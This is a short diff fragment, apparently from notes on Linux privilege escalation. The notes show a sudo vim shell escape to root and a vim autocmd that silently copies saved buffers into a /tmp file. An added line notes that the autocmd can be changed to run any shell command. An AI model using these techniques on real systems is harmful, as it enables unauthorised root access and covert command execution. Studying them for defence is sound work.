@@ -51,9 +51,9 @@ Login as victim user -> sudo vim  /opt/important.conf  -> :shell -> id=root
 :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
 :endif
 
+to run shell commands 
 
-
-
+We could just replace everything after ":silent" with "!" followed by a shell script name or shell command.
 
 
 
